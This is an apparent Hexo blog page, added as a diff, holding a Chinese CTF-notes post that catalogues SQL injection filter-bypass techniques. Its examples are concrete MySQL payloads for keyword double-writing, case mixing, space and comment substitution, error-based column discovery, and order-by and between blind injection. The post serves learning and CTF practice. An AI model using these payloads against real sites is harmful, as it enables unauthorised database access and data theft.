@@ -1,0 +1,1552 @@
+<!DOCTYPE html>
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="最近做SQL注入的题碰到注入时过滤了一些字符、关键字的情况，总结一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入过滤">
+<meta property="og:url" content="http://yoursite.com/2018/11/23/SQL注入过滤/index.html">
+<meta property="og:site_name" content="gtfly">
+<meta property="og:description" content="最近做SQL注入的题碰到注入时过滤了一些字符、关键字的情况，总结一下">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-03-08T23:01:28.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入过滤">
+<meta name="twitter:description" content="最近做SQL注入的题碰到注入时过滤了一些字符、关键字的情况，总结一下">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/23/SQL注入过滤/">
+
+
+
+
+
+  <title>SQL注入过滤 | gtfly</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><script> 
+ function GetRandomNum(Min,Max) 
+ { 
+    var Range = Max - Min; 
+    var Rand = Math.random(); 
+    return(Min + Math.round(Rand * Range)); 
+ } 
+ function setSidebarMarginTop (headerOffset) { 
+    return $('#sidebar').css({ 'margin-top': headerOffset }); 
+ } 
+ function getHeaderOffset () { 
+    return $('.header-inner').height() + CONFIG.sidebar.offset; 
+ }
+    window.onload=function() { 
+    var subtitle = "人生如逆旅，我亦是行人。"; 
+    var mytitle = subtitle.split("W"); 
+    var max = mytitle.length-1;
+    var index = GetRandomNum(0,max); 
+    var text = mytitle[index]; 
+    $("#helloTitle").html(text); 
+    var headOffset = getHeaderOffset(); 
+    setSidebarMarginTop(headOffset); 
+// alert(getHeaderOffset()); 
+ }  
+</script>
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gtfly</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人生如逆旅，我亦是行人。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resource">
+          <a href="https://github.com/gtfly?tab=stars" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-paper-plane"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/23/SQL注入过滤/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gtfly">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gtfly">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入过滤</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-23T18:44:30+08:00">
+                2018-11-23
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-03-09T07:01:28+08:00">
+                2019-03-09
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/11/23/SQL注入过滤/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/23/SQL注入过滤/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近做SQL注入的题碰到注入时过滤了一些字符、关键字的情况，总结一下</p>
+<a id="more"></a>
+<h3 id="检测是否被过滤"><a href="#检测是否被过滤" class="headerlink" title="检测是否被过滤"></a>检测是否被过滤</h3><p>检测字符是否被过滤，或使用 1’or 1=1# 登录绕过时，可使用的：</p>
+<pre><code>and    # 可用&amp;&amp;代替；get注入时需url编码为%26%26
+or       # 可用||代替
+^       # 二进制异或运算;二者相同为0，不同为1
+|       # 二进制或运算；二者都为0为0，否则为1
+&amp;       # 二进制与运算；二者都为1为1，否则为0;get注入时需url编码为%26使用</code></pre><h3 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h3><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>若只是简单的过滤一次，则可用双写的方法</p>
+<p>例，过滤了’or’</p>
+<pre><code>sth.replace(&apos;or&apos;,&apos;&apos;)</code></pre><p>则双写为’oorr’</p>
+<p>注：此时’information’、’for’…中也含有’or’，也需要双写！</p>
+<h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>进行简单的字符串比较时可用大小写混用的方法</p>
+<p>例，检测语句中是否有’union select’字符串，可以写成</p>
+<pre><code>UnIon SeLecT 1,2;</code></pre><h4 id="一些关键字符-串-的替换"><a href="#一些关键字符-串-的替换" class="headerlink" title="一些关键字符(串)的替换"></a>一些关键字符(串)的替换</h4><h5 id="1-字符串截取函数："><a href="#1-字符串截取函数：" class="headerlink" title="1.字符串截取函数："></a>1.字符串截取函数：</h5><p>常用的截取函数：</p>
+<pre><code>substr(字符串，开始位置，长度)
+mid(字符串，开始位置，长度)
+substring(字符串，开始位置，长度)
+#位置从1开始；php中的substr位置从0开始</code></pre><p>作用相同</p>
+<p>另：除了(字符串，开始位置，长度)这种形式的截取方式以外，还有</p>
+<pre><code>(字符串 from num1 for num2)  截取字符串从位置num1开始，截取长度为num2
+(字符串 from num )   num&gt;0时，截取字符串从位置num到最后；num&lt;0时，截取字符串从最后一位开始截取num位</code></pre><p>其他的截取函数：</p>
+<pre><code>left(s,n)    返回字符串s的前n个字符
+right(s,n)    返回字符串s的后n个字符</code></pre><h5 id="2-空格"><a href="#2-空格" class="headerlink" title="2.空格"></a>2.空格</h5><p>可用()(括号中间不能为关键字)、注释符/**/、%0a代替，例：</p>
+<pre><code>select(users)from(information);
+
+select/**/users/**/from/**/information;
+
+http://127.0.0.1/labs/Less-1/?id=1%0aand%0a1=1</code></pre><h5 id="3-比较符"><a href="#3-比较符" class="headerlink" title="3.比较符"></a>3.比较符</h5><p>不等于符：</p>
+<pre><code>!=可用&lt;&gt;代替</code></pre><p>等于符：</p>
+<pre><code>like  #模糊匹配符
+if(length(database())like(3),1,0)
+
+
+regexp  #正则匹配符
+if(length(database())regexp(3),1,0)</code></pre><p>IN 操作符允许我们在 WHERE 子句中规定多个值：</p>
+<pre><code>SELECT column_name(s)
+FROM table_name
+WHERE column_name IN (value1,value2,...)</code></pre><p>另：</p>
+<pre><code>greatest() 返回最大值
+least()    返回最小值</code></pre><h5 id="4-ascii码"><a href="#4-ascii码" class="headerlink" title="4.ascii码"></a>4.ascii码</h5><pre><code>ascii与ord等价;都是返回字符串首位的ascii值
+
+char() 返回数值对应的ascii
+(python中chr()返回数值对应的ascii)</code></pre><p>若ascii、ord等求ascii的函数被过滤了，可以根据原字符匹配(费时间)，也可进行模糊匹配(若一位一位的匹配，无法确定字符的重复性、顺序性)</p>
+<pre><code>#使用ascii进行模糊匹配
+select if(database()regexp(char(116)),1,0);</code></pre><p>还可使用16进制比较的方式；使用16进制时，要在数前加上 0x</p>
+<pre><code>hex()  求16进制
+
+#使用hex进行模糊匹配
+if(database()regexp(0x99),1,0); </code></pre><p>另：</p>
+<pre><code>strcmp(str1, str2) 比较两个字符串(16进制)；如果这两个字符串(16进制)相等返回0，
+若str1的16进制大于str2的16进制则返回1，否则返回0</code></pre><p>注：ascii与16进制均不能表示变量，只能表示字符(串)</p>
+<p>比如，有这样一个SQL语句：</p>
+<pre><code>select * from users where username=&apos;cat&apos;;</code></pre><p>‘cat’可以分别用ascii和hex表示：</p>
+<pre><code>select * from users where username=char(99,97,116);
+
+select * from users where username=0x636174;</code></pre><p>如果引号或表的某条内容，例如用户名为admin，‘admin’被过滤了，就可以用ascii或16进制的方式</p>
+<h5 id="5-逗号"><a href="#5-逗号" class="headerlink" title="5.逗号"></a>5.逗号</h5><p>1.</p>
+<pre><code>select 1,2;
+select * from (select 1)a join (select 2)b;
+#等价</code></pre><p>2.</p>
+<pre><code>limit a,b
+limit b offset a
+#等价；位置a从0开始，b为长度</code></pre><h5 id="6-注释符"><a href="#6-注释符" class="headerlink" title="6.注释符"></a>6.注释符</h5><p>若</p>
+<pre><code>#
+-- (空格)</code></pre><p>被过滤了，可让查询/运算的最后一个数据为字符</p>
+<pre><code>1&apos;union select &apos;2
+select username from users where id=&apos; 1&apos;union select &apos;2 &apos;;
+
+1&apos;^1=&apos;1
+select username from users where id=&apos; 1&apos;^1=&apos;1 &apos;;</code></pre><p>注：SQL运算时会进行类型转换</p>
+<pre><code>select username from users where id=&apos;1&apos;;
+select username from users where id=1;
+#等价
+
+select password from users where username=&apos;1&apos;^1=&apos;1&apos;;
+select password from users where username=&apos;1&apos;-1-&apos;&apos;;
+select password from users where username=0;
+#等价,会报出所有username首字母不为数字的数据</code></pre><h5 id="7-if"><a href="#7-if" class="headerlink" title="7.if"></a>7.if</h5><pre><code>if(exp,a,b)   #表达式exp正确则返回a,否则返回b</code></pre><p>等价于</p>
+<pre><code>case when 1 then a when 2 then b else c end
+#如果为1则返回a，如果为2返回b，否则返回c(可省略then a when 2)</code></pre><h5 id="8-sleep"><a href="#8-sleep" class="headerlink" title="8.sleep"></a>8.sleep</h5><p>在盲注时一般会用到sleep函数，可以用benchmark这个函数替换</p>
+<pre><code>mysql&gt; select benchmark(1000000,encode(1,2));
++--------------------------------+
+| benchmark(1000000,encode(1,2)) |
++--------------------------------+
+|                              0 |
++--------------------------------+
+1 row in set (5.45 sec)</code></pre><p>即将encode这个函数执行1000000次，因此会花费一些时间，与sleep效果相同</p>
+<h5 id="9-information-schema-tables-columns"><a href="#9-information-schema-tables-columns" class="headerlink" title="9.information_schema.tables/columns"></a>9.information_schema.tables/columns</h5><p>小数点的前后加空格也可以正常使用：</p>
+<pre><code>mysql&gt; select 1 from users where id=-1 union select group_concat(table_name) from information_schema . tables where table_schema=database();
++-------------------------+
+| 1                       |
++-------------------------+
+| biu,users,users1,users2 |
++-------------------------+
+1 row in set (0.00 sec)</code></pre><p>在注入时有时需这样绕过：</p>
+<pre><code>union%20select%201,2,group_concat(table_name)%20from%20information_schema%0a.%0atables%20where%20table_schema=database()%23</code></pre><p>其执行的语句为：</p>
+<pre><code>union select 1,2,group_concat(table_name) from information_schema . tables where table_schema=database()#</code></pre><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="一般的注入方法"><a href="#一般的注入方法" class="headerlink" title="一般的注入方法"></a>一般的注入方法</h5><pre><code>双查询注入
+updatexml(目标xml文档，xml路径，更新的内容) 
+extractvalue(目标xml文档，xml路径) </code></pre><h5 id="若将information等关键字过滤了："><a href="#若将information等关键字过滤了：" class="headerlink" title="若将information等关键字过滤了："></a>若将information等关键字过滤了：</h5><p>使用了SQL中不存在的函数会报错出于当前数据库的信息</p>
+<p>获取当前数据库：</p>
+<pre><code>1&apos; and asdf()%23  </code></pre><p>获取当前数据表</p>
+<pre><code>Polygon(id)
+linestring(id)</code></pre><p>获取当前表中字段</p>
+<p>join子句：</p>
+<pre><code>把来自两个或多个表的行结合起来
+on指定连接条件；using指定需要哪些列相等(字段名合并)</code></pre><p>例：</p>
+<pre><code>a join b</code></pre><p>若a有2行数据，b有3行数据，join后有6行数据</p>
+<p>又a中有字段id，值为1,3；b有字段id，值为1,2,3，</p>
+<pre><code>可指定
+a join b on(a.id=b.id) #返回的表有两行，有两个id字段，值都为1,3
+也可指定
+a join b using(id) #返回的表有两行，有一个id字段，值为1,3</code></pre><p>在使用别名的时候，表中不能出现相同的字段名，否则就会报错</p>
+<pre><code>select * from users where id=1 and 
+(select * from (select * from users as a join users as b)as c);
+#可得到第一个字段名
+#若第一个字段名为id，则
+select * from users where id=1 and 
+(select * from (select * from users as a join users as b using(id))as c);
+#可得到第二个字段名
+#若第二个字段名为username
+select * from users where id=1 and 
+(select * from (select * from users as a join users as b using(id,username)as c);
+可得到第三个字段名
+...</code></pre><h4 id="使用order-by进行盲注"><a href="#使用order-by进行盲注" class="headerlink" title="使用order by进行盲注"></a>使用order by进行盲注</h4><p>过滤字段名获取数据</p>
+<pre><code>order by num  #逐位比较字符串的16进制的大小，默认从小到大的顺序</code></pre><p>若有表：</p>
+<pre><code>mysql&gt; select * from users1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | admin    | asdf     |
++----+----------+----------+</code></pre><p>若要获取admin的密码，但不知道字段名</p>
+<pre><code>mysql&gt; select * from users1 union select 1,2,0x61 order by 3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | a        |
+|  1 | admin    | asdf     |
++----+----------+----------+</code></pre><p>0x61为字符a的16进制</p>
+<pre><code>mysql&gt; select * from users1 union select 1,2,0x62 order by 3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | admin    | asdf     |
+|  1 | 2        | b        |
++----+----------+----------+</code></pre><p>当联合查询部分有0x61时，显示2，当联合查询部分有0x62时，显示admin，则说明0x61对应的字符即为密码的首位，则可写盲注脚本…</p>
+<h4 id="使用between进行盲注"><a href="#使用between进行盲注" class="headerlink" title="使用between进行盲注"></a>使用between进行盲注</h4><p>当前数据库名为：</p>
+<pre><code>mysql&gt; select database();
++------------+
+| database() |
++------------+
+| test1      |
++------------+
+1 row in set (0.00 sec)</code></pre><p>使用between and语句进行查询：</p>
+<pre><code>mysql&gt; select database() between &apos;s&apos; and &apos;u&apos;;
++--------------------------------+
+| database() between &apos;s&apos; and &apos;u&apos; |
++--------------------------------+
+|                              1 |
++--------------------------------+
+1 row in set (0.00 sec)</code></pre><p>由于首字母t位于s和u之间，则会返回1，否则返回0：</p>
+<pre><code>mysql&gt; select database() between &apos;s&apos; and &apos;t&apos;;
++--------------------------------+
+| database() between &apos;s&apos; and &apos;t&apos; |
++--------------------------------+
+|                              0 |
++--------------------------------+
+1 row in set (0.00 sec)</code></pre><p>between A and B的范围为：大于等于A，小于B，如下面的查询也会返回1：</p>
+<pre><code>mysql&gt; select database() between &apos;t&apos; and &apos;u&apos;;
++--------------------------------+
+| database() between &apos;t&apos; and &apos;u&apos; |
++--------------------------------+
+|                              1 |
++--------------------------------+
+1 row in set (0.00 sec)</code></pre><p>当然，以上字母都可以用16进制代替</p>
+<p>参考</p>
+<pre><code>https://www.secpulse.com/archives/68991.html
+https://www.cnblogs.com/Vinson404/p/7253255.html
+http://shaobaobaoer.cn/archives/701/anheng-11yue-wp-unfinish#BETWEEN</code></pre>
+      
+    </div>
+    
+    
+    
+
+  <div>
+    
+      ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="gtfly 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="gtfly 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    gtfly
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2018/11/23/SQL注入过滤/" title="SQL注入过滤">http://yoursite.com/2018/11/23/SQL注入过滤/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/22/Bugku-flag-php/" rel="next" title="Bugku-flag.php">
+                <i class="fa fa-chevron-left"></i> Bugku-flag.php
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/26/Bugku过滤注入题目分析/" rel="prev" title="Bugku过滤注入题目分析">
+                Bugku过滤注入题目分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">gtfly</p>
+              <p class="site-description motion-element" itemprop="description">轻描时光漫长低唱语焉不详.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">148</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.bugku.com/login?next=challenges" title="Bugku" target="_blank">Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://new.bugku.com/" title="new Bugku" target="_blank">new Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.linkedbyx.com/home" title="X计划平台" target="_blank">X计划平台</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.shiyanbar.com/ctf/practice" title="实验吧" target="_blank">实验吧</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf.jasec.cn/index.php?page=login" title="Jactf" target="_blank">Jactf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jarvisoj.com/login" title="Javis" target="_blank">Javis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cgctf.nuptsast.com/challenges#Web" title="CGctf" target="_blank">CGctf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com/" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.ssleye.com/" title="ctf在线工具" target="_blank">ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.194nb.com/" title="aman ctf在线工具" target="_blank">aman ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ctfwp.com/" title="ctfwp" target="_blank">ctfwp</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测是否被过滤"><span class="nav-number">1.</span> <span class="nav-text">检测是否被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用绕过"><span class="nav-number">2.</span> <span class="nav-text">常用绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#双写绕过"><span class="nav-number">2.1.</span> <span class="nav-text">双写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#大小写绕过"><span class="nav-number">2.2.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些关键字符-串-的替换"><span class="nav-number">2.3.</span> <span class="nav-text">一些关键字符(串)的替换</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-字符串截取函数："><span class="nav-number">2.3.1.</span> <span class="nav-text">1.字符串截取函数：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-空格"><span class="nav-number">2.3.2.</span> <span class="nav-text">2.空格</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-比较符"><span class="nav-number">2.3.3.</span> <span class="nav-text">3.比较符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-ascii码"><span class="nav-number">2.3.4.</span> <span class="nav-text">4.ascii码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-逗号"><span class="nav-number">2.3.5.</span> <span class="nav-text">5.逗号</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-注释符"><span class="nav-number">2.3.6.</span> <span class="nav-text">6.注释符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-if"><span class="nav-number">2.3.7.</span> <span class="nav-text">7.if</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-sleep"><span class="nav-number">2.3.8.</span> <span class="nav-text">8.sleep</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9-information-schema-tables-columns"><span class="nav-number">2.3.9.</span> <span class="nav-text">9.information_schema.tables/columns</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入"><span class="nav-number">2.4.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" 